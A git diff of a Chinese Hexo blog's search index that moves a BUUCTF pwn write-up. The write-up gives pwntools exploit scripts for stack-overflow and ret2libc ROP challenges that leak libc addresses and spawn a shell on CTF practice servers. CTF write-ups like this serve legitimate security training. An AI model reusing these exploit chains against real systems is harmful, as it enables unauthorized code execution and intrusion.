@@ -1,122 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>hexo折腾实录</title>
-    <url>/2024/06/11/hexo/</url>
-    <content><![CDATA[<p>戳👉<a
-href="https://hexo.io/docs/">hexo官方文档</a>阅读官方文档。</p>
-<h3 id="使用next模板">使用next模板</h3>
-<p><a
-href="https://theme-next.js.org/docs/getting-started/">官方教程</a>
-为了方便后续配置，可以使用如下命令建立符号连接</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s node_modules/hexo-theme-next/_config.yml _config.next.yml</span><br></pre></td></tr></table></figure>
-<h3 id="自定义新建post文章的yaml">自定义新建post文章的yaml</h3>
-<p>修改scaffold中的post.md.</p>
-<h3
-id="设置hexo首页只显示文章部分摘要">设置hexo首页只显示文章部分摘要</h3>
-<p>针对next主题，有两种方法。</p>
-<ol type="1">
-<li><p>添加文章概述</p>
-<p>在开头的yaml中加入<code>description: xxx</code>，这样的话就只会显示<code>description</code>了。</p></li>
-<li><p>在文章中想截断的部分加入<code>&lt;!--more--&gt;</code></p></li>
-</ol>
-<h3 id="让hexo支持数学公式">让hexo支持数学公式</h3>
-<p>有问题先看<a
-href="https://theme-next.js.org/docs/third-party-services/math-equations.html">官方教程</a>！找了很多博客都不行。</p>
-]]></content>
-      <categories>
-        <category>Tinker</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf-pwn刷题之旅</title>
-    <url>/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/</url>
-    <content><![CDATA[<h1 id="连上就有flag的pwn">连上就有flag的pwn</h1>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568305685314.png" class="" width="1568305685314">
-<h1 id="rip覆盖一下">RIP覆盖一下</h1>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307672397.png" class="" width="1568307672397">
-<p>IDA看一下：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307909466.png" class="" width="1568307909466">
-<p>典型的溢出，函数中有fun函数：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307994407.png" class="" width="1568307994407">
-<p>看一下偏移：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568308011545.png" class="" width="1568308011545">
-<p>有一个需要注意的地方就是nc连上发现没有输出input，直接让我输入，所以exp改了一下。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">6001</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn1&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>得到flag：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568308290836.png" class="" width="1568308290836">
-<h1 id="ciscn_2019_c_1">ciscn_2019_c_1</h1>
-<p>还是个64位的ELF，IDA分析一下：</p>
-<p>main函数里没有啥：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359070246.png" class="" width="1568359070246">
-<p>encrypt()函数里存在栈溢出：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359126837.png" class="" width="1568359126837">
-<p>由于程序中没有system和sh所以ROP攻击。</p>
-<p>思路是通过栈溢出返回程序中的puts函数把gets函数的地址泄露出来，然后找到偏移地址，再调用system和/bin/sh来获得shell。</p>
-<p>看一下s：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359326141.png" class="" width="1568359326141">
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20115</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400B28</span></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = e.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;puts_plt =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;gets_got =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_got)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload1 += p64(rdi_addr) + p64(gets_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">gets_leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;get_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;gets&#x27;</span>, gets_leak)</span><br><span class="line">libc_base = gets_leak - libc.dump(<span class="string">&#x27;gets&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> *(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行得到flag：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359451505.png" class="" width="1568359451505">
-<h1 id="warmup_csaw_2016">warmup_csaw_2016</h1>
-<p>看一下源码：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359953444.png" class="" width="1568359953444">
-<p>很明显的栈溢出。程序中还有这个：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359977736.png" class="" width="1568359977736">
-<p>没啥说的了，直接上exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20035</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>得到flag：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568360050956.png" class="" width="1568360050956">
-<h1 id="pwn1_sctf_2016">pwn1_sctf_2016</h1>
-<p>分析源码：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381486365.png" class="" width="1568381486365">
-<p>第13行发现传入的s被限制在了31个字符，没法溢出，但是接着看发现当输入I的时候，程序会把I变成you，这样一来原本一个字符就变成了三个字符，可以溢出了！</p>
-<p>发现程序中有get_flag函数：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381665781.png" class="" width="1568381665781">
-<p>那么思路就是溢出让程序返回get_flag函数。</p>
-<p>动态调试查看输入的起始地址为FFCD1D48（you是程序运行自己修改的）：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381364714.png" class="" width="1568381364714">
-<p>程序返回地址存放的位置为FFCD1D90：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381400442.png" class="" width="1568381400442">
-<p>所以偏移量就是90-4C-4=0x40=64，那么就需要填充64个字节，所以构造21个I加一个A，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>,<span class="number">20086</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/pwn1_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = e.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;get_flag_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(get_flag)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span> * <span class="number">21</span> + <span class="string">&#x27;A&#x27;</span> + p32(get_flag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
-<p>得到flag：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568382235211.png" class="" width="1568382235211">
-<h1 id="ciscn_2019_en_1">ciscn_2019_en_1</h1>
-<p>和ciscn_2019_c_1一模一样，exp改个端口号就行了。</p>
-<h1 id="ciscn_2019_n_1">ciscn_2019_n_1</h1>
-<p>源码很简单：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568388929535.png" class="" width="1568388929535">
-<p>就是一个简单的溢出让v2变成11.28125。v1是var_30，v2是var_4：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389165705.png" class="" width="1568389165705">
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389212921.png" class="" width="1568389212921">
-<p>再看一下11.28125在程序中的表示：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389275163.png" class="" width="1568389275163">
-<p>也就是让v2变成41348000h，所以exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20137</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568386840196.png" class="" width="1568386840196">
-<p>我去，居然告诉我没有flag，可能是出题的时候环境配的有问题吧，或者是就是个坑。</p>
-<p>不过没关系，那就ROP，具体没啥好说的和前几道题都差不多，，不多说了。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20137</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/ciscn_2019_n_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400793</span></span><br><span class="line">start = <span class="number">0x4006DC</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = e.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;gets_got =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_got)))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload1 += p64(rdi_addr) + p64(gets_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;11.28125\n&#x27;</span>)</span><br><span class="line">gets_leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;gets_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;gets&#x27;</span>, gets_leak)</span><br><span class="line">libc_base = gets_leak - libc.dump(<span class="string">&#x27;gets&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>取得shell，得到flag：</p>
-<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568423814631.png" class="" width="1568423814631">
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PDF如何添加目录</title>
     <url>/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/</url>
     <content><![CDATA[<p>不知道大伙有没有遇到这样的问题：在网上找的很多PDF都没有目录，尤其是一些扫描版pdf，或者是有目录但是页码错误等等。这样非常不方便我们查阅和学习，为了解决这些问题，我们可以自己手动给PDF添加目录，添加的过程很简单，下面就教大家如何添加目录。</p>
@@ -203,6 +87,91 @@ id="使用freepic2pdf解决页码偏移问题">使用FreePic2Pdf解决页码偏�
       </categories>
       <tags>
         <tag>PDF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuctf-pwn刷题之旅</title>
+    <url>/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/</url>
+    <content><![CDATA[<h1 id="连上就有flag的pwn">连上就有flag的pwn</h1>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568305685314.png" class="" width="1568305685314">
+<h1 id="rip覆盖一下">RIP覆盖一下</h1>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307672397.png" class="" width="1568307672397">
+<p>IDA看一下：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307909466.png" class="" width="1568307909466">
+<p>典型的溢出，函数中有fun函数：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307994407.png" class="" width="1568307994407">
+<p>看一下偏移：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568308011545.png" class="" width="1568308011545">
+<p>有一个需要注意的地方就是nc连上发现没有输出input，直接让我输入，所以exp改了一下。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">6001</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn1&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568308290836.png" class="" width="1568308290836">
+<h1 id="ciscn_2019_c_1">ciscn_2019_c_1</h1>
+<p>还是个64位的ELF，IDA分析一下：</p>
+<p>main函数里没有啥：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359070246.png" class="" width="1568359070246">
+<p>encrypt()函数里存在栈溢出：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359126837.png" class="" width="1568359126837">
+<p>由于程序中没有system和sh所以ROP攻击。</p>
+<p>思路是通过栈溢出返回程序中的puts函数把gets函数的地址泄露出来，然后找到偏移地址，再调用system和/bin/sh来获得shell。</p>
+<p>看一下s：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359326141.png" class="" width="1568359326141">
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20115</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400B28</span></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = e.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;puts_plt =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;gets_got =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_got)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload1 += p64(rdi_addr) + p64(gets_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">gets_leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;get_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;gets&#x27;</span>, gets_leak)</span><br><span class="line">libc_base = gets_leak - libc.dump(<span class="string">&#x27;gets&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> *(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行得到flag：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359451505.png" class="" width="1568359451505">
+<h1 id="warmup_csaw_2016">warmup_csaw_2016</h1>
+<p>看一下源码：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359953444.png" class="" width="1568359953444">
+<p>很明显的栈溢出。程序中还有这个：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359977736.png" class="" width="1568359977736">
+<p>没啥说的了，直接上exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20035</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568360050956.png" class="" width="1568360050956">
+<h1 id="pwn1_sctf_2016">pwn1_sctf_2016</h1>
+<p>分析源码：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381486365.png" class="" width="1568381486365">
+<p>第13行发现传入的s被限制在了31个字符，没法溢出，但是接着看发现当输入I的时候，程序会把I变成you，这样一来原本一个字符就变成了三个字符，可以溢出了！</p>
+<p>发现程序中有get_flag函数：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381665781.png" class="" width="1568381665781">
+<p>那么思路就是溢出让程序返回get_flag函数。</p>
+<p>动态调试查看输入的起始地址为FFCD1D48（you是程序运行自己修改的）：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381364714.png" class="" width="1568381364714">
+<p>程序返回地址存放的位置为FFCD1D90：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381400442.png" class="" width="1568381400442">
+<p>所以偏移量就是90-4C-4=0x40=64，那么就需要填充64个字节，所以构造21个I加一个A，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>,<span class="number">20086</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/pwn1_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = e.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;get_flag_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(get_flag)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span> * <span class="number">21</span> + <span class="string">&#x27;A&#x27;</span> + p32(get_flag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568382235211.png" class="" width="1568382235211">
+<h1 id="ciscn_2019_en_1">ciscn_2019_en_1</h1>
+<p>和ciscn_2019_c_1一模一样，exp改个端口号就行了。</p>
+<h1 id="ciscn_2019_n_1">ciscn_2019_n_1</h1>
+<p>源码很简单：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568388929535.png" class="" width="1568388929535">
+<p>就是一个简单的溢出让v2变成11.28125。v1是var_30，v2是var_4：</p>
